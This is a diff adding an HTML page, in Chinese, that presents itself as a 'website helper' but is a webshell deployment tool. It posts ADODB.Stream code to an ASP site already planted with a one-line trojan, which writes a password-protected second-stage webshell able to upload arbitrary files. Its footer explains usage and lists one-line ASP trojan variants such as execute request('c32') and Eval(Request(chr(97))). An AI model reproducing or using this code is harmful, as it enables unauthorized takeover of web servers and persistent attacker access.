@@ -1,0 +1,138 @@
+<html>
+<head>
+<title>c32 - 网站小助手</title>
+<style type="text/css">
+<!--
+body {
+	background-color: #999999;
+	
+}
+.liuyes {
+	border: 1px solid #660099;
+	font-size: 12px;
+}
+-->
+</style></head>
+<body>
+<table width="329" border="0" align="center" class="liuyes">
+  <tr>
+    <td height="17"> 
+    <form  method=post name="liuyes">
+<input name="act" type="text" id="act" size="112" value="http://www.csmp.cn/01.asp">
+<input type=submit a=GO... onClick="javascript:liuyes.action=document.all.act.value;">
+	</td>
+  </tr>
+  <tr>
+    <td height="18">
+	<textarea name=value cols=120 rows=10 width=45>set lP=server.createObject("Adodb.Stream") 
+lP.Open 
+lP.Type=2 
+lP.CharSet="gb2312" 
+lP.writetext request("liuyes1") 
+lP.SaveToFile server.mappath("0x7863.asp"),2 
+lP.Close 
+set lP=nothing 
+response.redirect "0x7863.asp" 
+</textarea> 
+	</td>
+  </tr>
+  <tr>
+    <td height="37">
+	<textarea name=liuyes1 cols=120 rows=10 width=45>
+
+
+
+<STYLE type=text/css><!--body {
+	background-image:url(http://218.80.193.2:918/4.jpg);
+	background-repeat:repeat;
+	background-attachment:fixed;
+	background-position:50% 50%;
+	background-color: #000000;
+	background-image: url(http://218.80.193.2:918/4.jpg);
+}--> </STYLE>
+<EMBED src= width="1" height="1" hidden=true AUTOSTART="TRUE" LOOP="TRUE" type=audio/x-ms-wma></EMBED>
+<%
+'┌───────────────┐
+'│By:0x7863     │QQ群:43910940 │
+'└───────────────┘
+dim Userpwd,URL,Info,ServerIP,EvilST
+Userpwd  = "root"   '
+URL      = Request.ServerVariables("URL")
+Info     = Request.ServerVariables("Appl_Physical_Path") 
+ServerIP = Request.ServerVariables("LOCAL_ADDR")
+EvilST = "<hr><font color=#00ff00  style='font-size: 12px'>0x7863专用加密版小马</font>"
+If Request("pwd")=Userpwd or Request("pwd")=Request.ServerVariables("URL") then Session("c32")=Userpwd
+If Session("c32")<>Userpwd Then
+  If Request.Form("pwd")<>"" Then
+    If Request.Form("pwd")=Userpwd Then
+      Session("c32")=Userpwd
+      Response.Redirect URL
+    Else
+	Response.Write"<br><br><div align=center style='font-size: 12px'><font color=red>对不起，密码验证失败"
+	Response.Write"密码验证失败<br><br><a href='"&URL&"'>返回上一级目录</a></div>"
+    End If
+  Else
+    RW="<title>" & ServerIP & " - </title><center>"
+    RW=RW & "<div style='width:500px;border:1px solid #222;padding:18px;margin:80px;'>"
+    RW=RW & "<a href='http://www.baidu.com' ><span style='text-decoration: none'>【0x7863专用小马】</a><hr>"
+    RW=RW & "<form action='" & URL & "' method='post'>"
+    RW=RW & "加密：</font><input name='pwd' type='password' size='22' style='font-size: 12px;border:1px solid #000'> <input style='font-size: 12px;border:1px solid #000' type='submit' value='密码验证'>"
+    RW=RW & "" & EvilST & "</center>"
+    Response.Write RW
+    RW=""
+  End If
+  Response.End
+End If
+%>
+<%="<center><div style='width:500px;border:1px solid #222;padding:12px;margin:80px;'>"%>
+<%="<hr></center>"%>
+<%on error resume next%>
+<%ofso="scripting.filesystemobject"%>
+<%set fso=server.createobject(ofso)%>
+<%path=request("path")%>
+<%if path<>"" then%>
+<%data=request("dama")%>
+<%set dama=fso.createtextfile(path,true)%>
+<%dama.write data%>
+<%if err=0 then%>
+<%="<font size='2' color='red'>恭喜！已成功上传文件到：  "%>
+<%= path%>
+<%="</font>"%>
+<%else%>
+<%="<font size='2' color='red'>上传失败</font>"%>
+<%end if%>
+<%err.clear%>
+<%end if%>
+<%dama.close%>
+<%set dama=nothing%>
+<%set fos=nothing%>
+<%="<title>" & ServerIP & " - </title>"%>
+<%="<form action='' method=post>"%>
+<%="<font style=color:#00ff00;>设置大马路径: </font><input type=text name=path size=50 value="&Info&">"%>
+<%="<br><font style=color:#00ff00;>本程序根目录: </font><font style=color:#00ff00;>"%>
+<%=server.mappath(request.servervariables("script_name"))%>
+<%="</font><br>"%>
+<%="<textarea name=dama cols=64 rows=6 ></textarea><br><br>"%>
+<%="<input type='submit' value='上传保存'>"%>
+<%="</form><center>" & EvilST & "</div>"%>
+
+
+
+
+
+
+</textarea>
+	</td>
+  </tr>
+  <tr>
+    <td>
+	  <font color="#000066">说明：本程序主要是为了方便提交使用一句话木马&lt;%execute request("c32")%&gt;而设计的，使用方法很简单，只要把<br><br>你已经插入一句话木马的网址写到上面的文本框中，然后点击后面的按钮提交即可！<br>
+&lt;%Eval(Request(chr(97)))%&gt;一句话木马，密码a</br>
+&lt;scriptlanguage=VBscript runat=server>execute request("c32")</Script&gt;</br>
+<br>程序设计：<font color="#FF0000">c32</font>&nbsp;&nbsp;&nbsp;QQ群:<font color="#FF0000">43910940</font></font>
+	
+	</td>
+  </tr>
+</table>
+</body>
+</html>
